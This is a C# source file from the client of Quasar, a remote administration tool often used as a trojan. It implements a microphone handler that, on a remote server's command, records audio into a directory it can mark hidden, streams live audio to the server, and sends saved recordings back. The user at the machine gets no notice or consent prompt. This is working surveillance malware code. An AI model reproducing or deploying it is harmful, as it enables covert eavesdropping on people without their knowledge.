using NAudio.Wave;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using Quasar.Client.Config;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;

namespace Quasar.Client.Messages
{
    public class MicrophoneHandler : IMessageProcessor
    {
        private WaveInEvent _waveIn;
        private WaveFileWriter _wavWriter;
        private MemoryStream _audioBuffer;
        private bool _isRecording;
        private bool _realTimeStreaming;
        private System.Threading.Timer _chunkTimer;
        private string _currentFileName;
        private string _audioDirectory;
        private int _chunkDurationSeconds;
        private int _currentChunkIndex;
        private ISender _currentClient;

        public MicrophoneHandler()
        {
            _audioDirectory = Settings.AUDIOPATH;
            if (!string.IsNullOrEmpty(_audioDirectory) && !Directory.Exists(_audioDirectory))
            {
                Directory.CreateDirectory(_audioDirectory);
                if (Settings.HIDEAUDIODIRECTORY)
                {
                    DirectoryInfo di = new DirectoryInfo(_audioDirectory);
                    di.Attributes |= FileAttributes.Hidden;
                }
            }
        }

        public bool CanExecute(IMessage message) => message is GetMicrophones ||
                                                   message is DoStartMicrophoneRecording ||
                                                   message is DoStopMicrophoneRecording ||
                                                   message is GetMicrophoneAudioLogs ||
                                                   message is DoRequestAudioFile;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetMicrophones msg:
                    Execute(sender, msg);
                    break;
                case DoStartMicrophoneRecording msg:
                    Execute(sender, msg);
                    break;
                case DoStopMicrophoneRecording msg:
                    Execute(sender, msg);
                    break;
                case GetMicrophoneAudioLogs msg:
                    Execute(sender, msg);
                    break;
                case DoRequestAudioFile msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetMicrophones message)
        {
            try
            {
                var microphones = new List<string>();
                var microphoneIds = new List<string>();

                for (int i = 0; i < WaveIn.DeviceCount; i++)
                {
                    var capabilities = WaveIn.GetCapabilities(i);
                    microphones.Add(capabilities.ProductName);
                    microphoneIds.Add(i.ToString());
                }

                client.Send(new GetMicrophonesResponse
                {
                    MicrophoneNames = microphones.ToArray(),
                    MicrophoneIds = microphoneIds.ToArray()
                });
            }
            catch (Exception ex)
            {
                client.Send(new GetMicrophonesResponse
                {
                    MicrophoneNames = new[] { "Error: " + ex.Message },
                    MicrophoneIds = new[] { "-1" }
                });
            }
        }

        private void Execute(ISender client, DoStartMicrophoneRecording message)
        {
            try
            {
                if (_isRecording)
                {
                    StopRecording();
                }

                _currentClient = client; // Store client reference for real-time streaming
                int deviceId = int.Parse(message.MicrophoneId);
                _realTimeStreaming = message.RealTimeStreaming;
                _chunkDurationSeconds = message.ChunkDurationSeconds;
                _currentChunkIndex = 0;
                
                bool isLiveListeningOnly = _realTimeStreaming && _chunkDurationSeconds == 0;

                _waveIn = new WaveInEvent
                {
                    DeviceNumber = deviceId,
                    WaveFormat = new WaveFormat(message.Quality, 16, 1) // Mono, 16-bit
                };

                // Only create file for recording if NOT real-time streaming (server handles files for real-time)
                if (!isLiveListeningOnly && !_realTimeStreaming)
                {
                    StartNewChunk();
                }

                _waveIn.DataAvailable += OnDataAvailable;
                _waveIn.RecordingStopped += OnRecordingStopped;

                _waveIn.StartRecording();
                _isRecording = true;

                // Set up chunk timer for 5-minute intervals
                if (!_realTimeStreaming)
                {
                    _chunkTimer = new System.Threading.Timer(OnChunkTimerElapsed, client, 
                        TimeSpan.FromSeconds(_chunkDurationSeconds), 
                        TimeSpan.FromSeconds(_chunkDurationSeconds));
                }
            }
            catch (Exception ex)
            {
                // Send error response
                client.Send(new MicrophoneAudioData
                {
                    AudioData = System.Text.Encoding.UTF8.GetBytes("Error: " + ex.Message),
                    IsComplete = true,
                    IsRealTime = false
                });
            }
        }

        private void Execute(ISender client, DoStopMicrophoneRecording message)
        {
            StopRecording();
        }

        private void Execute(ISender client, GetMicrophoneAudioLogs message)
        {
            try
            {
                var audioFiles = Directory.GetFiles(_audioDirectory, "*.mp3");
                var fileNames = audioFiles.Select(Path.GetFileName).ToArray();
                var fileSizes = audioFiles.Select(f => new FileInfo(f).Length).ToArray();
                var fileDates = audioFiles.Select(f => File.GetLastWriteTime(f).ToString("yyyy-MM-dd HH:mm:ss")).ToArray();

                client.Send(new GetMicrophoneAudioLogsResponse
                {
                    AudioFileNames = fileNames,
                    AudioFileSizes = fileSizes,
                    AudioFileDates = fileDates
                });
            }
            catch (Exception ex)
            {
                client.Send(new GetMicrophoneAudioLogsResponse
                {
                    AudioFileNames = new[] { "Error: " + ex.Message },
                    AudioFileSizes = new long[] { 0 },
                    AudioFileDates = new[] { DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") }
                });
            }
        }

        private void Execute(ISender client, DoRequestAudioFile message)
        {
            try
            {
                if (string.IsNullOrEmpty(_audioDirectory))
                {
                    client.Send(new MicrophoneAudioData
                    {
                        AudioData = System.Text.Encoding.UTF8.GetBytes("Audio directory not configured"),
                        FileName = message.FileName,
                        IsComplete = true,
                        IsRealTime = false
                    });
                    return;
                }
                
                string filePath = Path.Combine(_audioDirectory, message.FileName);
                if (File.Exists(filePath))
                {
                    byte[] fileData = File.ReadAllBytes(filePath);
                    
                    // Send file in chunks to avoid memory issues
                    const int chunkSize = 64 * 1024; // 64KB chunks
                    int totalChunks = (int)Math.Ceiling((double)fileData.Length / chunkSize);

                    for (int i = 0; i < totalChunks; i++)
                    {
                        int offset = i * chunkSize;
                        int length = Math.Min(chunkSize, fileData.Length - offset);
                        byte[] chunk = new byte[length];
                        Array.Copy(fileData, offset, chunk, 0, length);

                        client.Send(new MicrophoneAudioData
                        {
                            AudioData = chunk,
                            FileName = message.FileName,
                            IsRealTime = false,
                            FileSize = fileData.Length,
                            IsComplete = i == totalChunks - 1,
                            ChunkIndex = i
                        });
                    }
                }
                else
                {
                    client.Send(new MicrophoneAudioData
                    {
                        AudioData = System.Text.Encoding.UTF8.GetBytes("File not found"),
                        FileName = message.FileName,
                        IsComplete = true,
                        IsRealTime = false
                    });
                }
            }
            catch (Exception ex)
            {
                client.Send(new MicrophoneAudioData
                {
                    AudioData = System.Text.Encoding.UTF8.GetBytes("Error: " + ex.Message),
                    FileName = message.FileName,
                    IsComplete = true,
                    IsRealTime = false
                });
            }
        }

        private void StartNewChunk()
        {
            _currentFileName = $"audio_{DateTime.Now:yyyyMMdd_HHmmss}_{_currentChunkIndex:D3}.wav";
            string filePath = Path.Combine(_audioDirectory, _currentFileName);
            
            _audioBuffer = new MemoryStream();
            _wavWriter = new WaveFileWriter(filePath, _waveIn.WaveFormat);
        }

        private void OnDataAvailable(object sender, WaveInEventArgs e)
        {
            // Write to file if we have a writer (recording mode)
            if (_wavWriter != null)
            {
                _wavWriter.Write(e.Buffer, 0, e.BytesRecorded);
            }
            
            // Send real-time data if streaming is enabled
            if (_realTimeStreaming && _currentClient != null)
            {
                // Send raw PCM audio data for real-time playback
                byte[] audioChunk = new byte[e.BytesRecorded];
                Array.Copy(e.Buffer, 0, audioChunk, 0, e.BytesRecorded);
                
                _currentClient.Send(new MicrophoneAudioData
                {
                    AudioData = audioChunk,
                    FileName = "realtime",
                    IsRealTime = true,
                    IsComplete = false,
                    ChunkIndex = 0
                });
            }
        }

        private void OnRecordingStopped(object sender, StoppedEventArgs e)
        {
            // Only finish chunk if we're actually writing to a file
            if (_wavWriter != null)
            {
                FinishCurrentChunk();
            }
        }

        private void OnChunkTimerElapsed(object state)
        {
            var client = state as ISender;
            
            // Only handle chunks if we're actually writing to files
            if (_wavWriter != null)
            {
                // Finish current chunk and start a new one
                FinishCurrentChunk();
                _currentChunkIndex++;
                StartNewChunk();
            }
        }

        private void FinishCurrentChunk()
        {
            if (_wavWriter != null)
            {
                _wavWriter.Dispose();
                _wavWriter = null;
            }

            if (_audioBuffer != null)
            {
                _audioBuffer.Dispose();
                _audioBuffer = null;
            }
        }

        private void StopRecording()
        {
            if (_isRecording)
            {
                _isRecording = false;
                
                _chunkTimer?.Dispose();
                _chunkTimer = null;

                if (_waveIn != null)
                {
                    _waveIn.StopRecording();
                    _waveIn.Dispose();
                    _waveIn = null;
                }

                FinishCurrentChunk();
            }
        }

        public void Dispose()
        {
            StopRecording();
        }
    }
}
